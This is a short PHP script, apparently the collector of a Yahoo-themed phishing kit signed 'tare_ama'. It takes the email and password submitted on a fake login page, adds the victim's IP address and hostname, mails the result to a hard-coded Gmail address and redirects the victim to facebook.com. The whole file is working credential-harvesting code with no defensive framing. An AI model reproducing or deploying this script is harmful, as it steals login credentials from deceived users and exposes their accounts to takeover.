<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "==================+ Spam ReZulT +==================\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "PAss: ".$_POST['pass']."\n";

$message .= "===================+By tare_ama +===========\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=============+ Created in 2020 By tare_ama +=============\n";
$rnessage = "$message\n";
$send= "nouman.sa33d@gmail.com";
$subject = "yahoo | Login | $ip";
$headers = "From: pentest";

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
header("Location: http://facebook.com");
?>
